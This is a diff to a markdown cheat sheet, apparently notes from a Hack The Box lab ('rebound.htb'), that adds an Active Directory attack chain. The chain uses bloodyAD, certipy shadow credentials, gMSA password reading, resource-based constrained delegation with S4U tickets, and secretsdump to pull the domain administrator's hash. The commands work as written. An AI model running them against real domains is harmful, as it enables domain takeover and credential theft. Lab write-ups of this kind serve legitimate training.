@@ -38,11 +38,35 @@ python bloodyAD.py -u oorend -p 'pass' -d rebound.htb --host 10.10.11.231 add gr
 # you should see response below 
 [+] oorend added to SERVICEMGMT
 
-# Grant user GenericAll permiissions over an OU
+# Grant user GenericAll permissions over an OU
 python bloodyAD.py -d rebound.htb -u oorend -p 'pass' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
 
 # you should see response below 
 [+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
+
+# With GenericAll permission grab NT Hash via certipy - https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services
+certipy shadow auto -account winrm_svc -u "oorend@rebound.htb" -p $passwd -dc-ip 10.10.11.231 -k -target dc01.rebound.htb
+
+# ReadGMSAPassword attack using bloodyAD
+/root/bloodyAD/bloodyAD.py -d rebound.htb -u tbrady -p $passwd --host dc01.rebound.htb get object 'delegator$' --resolve-sd --attr msDS-ManagedPassword
+
+# Resource Based Constrained Delegation Attack - https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
+# obtain TGT ticket for delegator$ - use NTLM hash obtained from ReadGMSAPassword attack
+getTGT.py 'rebound.htb/delegator$@dc01.rebound.htb' -hashes aad3b435b51404eeaad3b435b51404ee:f8db61f5fd0643c073cd58ffcc81379f -dc-ip 10.10.11.231
+export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache
+
+# Assign delegation privilege to user 
+rbcd.py 'rebound.htb/delegator$' -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -use-ldaps -dc-ip 10.10.11.231 -debug -k -no-pass
+
+# Uses a service principal’s TGT to get a Kerberos service ticket for an SPN as an impersonated account via S4U
+getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass -dc-ip 10.10.11.231
+
+# Use the service’s TGT plus the delegator’s proof (S4U2Proxy with an additional-ticket) to request an HTTP service ticket issued to the target machine account, save that machine-account ticket to a ccache
+export KRB5CCNAME=dc01\$.ccache
+getST.py -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket "dc01$.ccache" "rebound.htb/delegator$" -hashes aad3b435b51404eeaad3b435b51404ee:f8db61f5fd0643c073cd58ffcc81379f -k -no-pass -dc-ip 10.10.11.231
+
+# Present machine-account Kerberos service ticket to DC for secrets dump
+secretsdump.py -no -k dc01.rebound.htb -just-dc-user administrator -dc-ip 10.10.11.231
 ```
 
 ## Transfer file via PowerShell to Linux
